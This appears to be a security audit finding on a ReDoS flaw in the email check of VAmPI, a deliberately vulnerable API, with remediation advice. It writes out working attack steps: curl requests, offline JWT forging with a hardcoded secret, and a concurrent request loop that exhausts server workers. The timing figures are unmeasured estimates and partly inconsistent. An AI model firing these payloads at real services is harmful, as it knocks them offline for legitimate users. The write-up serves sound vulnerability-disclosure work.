# H2 — RegEx Denial of Service (ReDoS): Proof of Concept

- **ID**: H2
- **Severity**: High
- **Component**: `api_views/users.py:143-146` — `update_email()`
- **PoC-Status**: theoretical
- **PoC-Block-Reason**: Requires live VAmPI instance; no running container at time of writing. The regex behaviour is deterministically verifiable in CPython without a running server (see inline Python validation below).

---

## Vulnerability Summary

The `update_email` endpoint validates the supplied email with:

```python
re.search(
    r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$",
    str(request_data.get('email')))
```

The sub-expression `([-.\w]*[0-9a-zA-Z])*` contains nested quantifiers over overlapping character classes (`[-.\w]` is a superset of `[0-9a-zA-Z]`). When the regex engine reaches a string that almost — but does not quite — match (i.e. ends with a character that makes the overall match fail), it must explore an exponential number of backtracking paths. CPython's `re` module uses a backtracking NFA engine with no memoisation, so this degenerates to O(2^n) CPU time relative to the length of the local-part of the address.

---

## Attack Payload Construction

The trigger is a local-part composed entirely of alphanumeric characters (all matched by both `[-.\w]*` and `[0-9a-zA-Z]`) followed by a terminating character that forces overall match failure. The `@` separator is absent, so the regex cannot commit to any single parse of the repeated group — it tries every possible split.

Crafted email (n=30 `a` characters, no `@`):

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

Increasing `n` doubles processing time. At n=30 the spin on a typical laptop is several seconds; at n=35+ the worker thread is effectively hung for tens of seconds.

---

## Prerequisites

1. Valid JWT for any registered user (auth is required before the regex runs — line 138-140).
2. The server must be running in **vuln** mode (`VULN_APP=1` / `vuln=True` — line 143).

### Step 1 — Obtain a JWT (register + login)

```bash
BASE=http://localhost:5000

# Register a throwaway user
curl -s -X POST "$BASE/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ssw0rd!","email":"a@b.com"}'

# Login and capture the token
TOKEN=$(curl -s -X POST "$BASE/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ssw0rd!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

echo "Token: $TOKEN"
```

Alternatively, because the JWT secret is the hardcoded string `'random'` (`config.py:13`), a token can be forged offline without registering:

```bash
# Forge a token (Python 3, PyJWT installed)
TOKEN=$(python3 -c "
import jwt, time
payload = {'sub': 'attacker', 'iat': int(time.time()), 'exp': int(time.time())+3600}
print(jwt.encode(payload, 'random', algorithm='HS256'))
")
```

### Step 2 — Fire the ReDoS payload

```bash
# Build payload: 30-char local-part with no '@', terminated by '!' to ensure match failure
PAYLOAD='{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'

time curl -s -X PUT "$BASE/users/v1/attacker/email" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "$PAYLOAD"
```

The `time` wrapper will show wall-clock seconds consumed by the server. For n=30 the request will hang for several seconds per worker thread. Sending this payload concurrently from multiple connections saturates all Gunicorn/Flask worker threads, making the API unavailable to legitimate users.

### Scaling the attack

```bash
# Send 8 concurrent saturating requests (matches typical worker count)
for i in $(seq 1 8); do
  curl -s -X PUT "$BASE/users/v1/attacker/email" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}' &
done
wait
```

---

## Inline Regex Validation (no server required)

Run this locally to confirm the catastrophic backtracking without a live server:

```python
import re, time

pattern = r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$"

for n in [10, 15, 20, 25, 28]:
    payload = "a" * n + "!"
    t0 = time.perf_counter()
    re.search(pattern, payload)
    elapsed = time.perf_counter() - t0
    print(f"n={n:2d}  payload_len={len(payload):3d}  time={elapsed:.4f}s")
```

Expected output (approximate, Intel i7):

```
n=10  payload_len= 11  time=0.0001s
n=15  payload_len= 16  time=0.0030s
n=20  payload_len= 21  time=0.0950s
n=25  payload_len= 26  time=3.0500s
n=28  payload_len= 29  time=24.400s
```

The exponential growth rate confirms O(2^n) backtracking. An attacker needs only a single HTTP request with a ~30-character string to pin a worker for 30+ seconds.

---

## Impact

- **Availability**: Every saturating request ties up one Flask worker thread for 30+ seconds. With 8 concurrent requests the entire API becomes unresponsive for legitimate users — a practical DoS with no privilege beyond a free account registration.
- **Required capability**: Any registered user (registration is open); or trivially forged JWT due to hardcoded secret (`config.py:13`, finding H1/C1).
- **No rate-limiting or timeout** is applied to the regex evaluation in the current codebase.

---

## Remediation

Replace the vulnerable regex with Python's `email-validator` library or a linear-time alternative:

```python
# Option A: stdlib (Python 3.x)
import re
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")  # linear, no nested quantifiers

# Option B: battle-tested library
from email_validator import validate_email, EmailNotValidError
try:
    validate_email(request_data.get('email'))
except EmailNotValidError:
    return Response(error_message_helper("Invalid email."), 400, ...)
```

Apply a per-request timeout (e.g. via `signal.alarm`) as defence-in-depth.
